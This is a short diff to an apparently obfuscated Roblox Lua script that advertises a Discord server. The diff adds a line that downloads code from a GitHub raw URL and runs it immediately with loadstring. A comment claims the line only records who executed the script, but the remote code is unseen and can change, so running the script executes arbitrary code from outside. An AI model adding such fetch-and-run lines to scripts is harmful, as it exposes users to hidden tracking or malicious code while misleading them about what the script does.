@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Insanxty/roblox/main/log", true))()
+-- this line above is just to see who executed my script, if you do not want it copy this and delete the line above.
+
 _, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
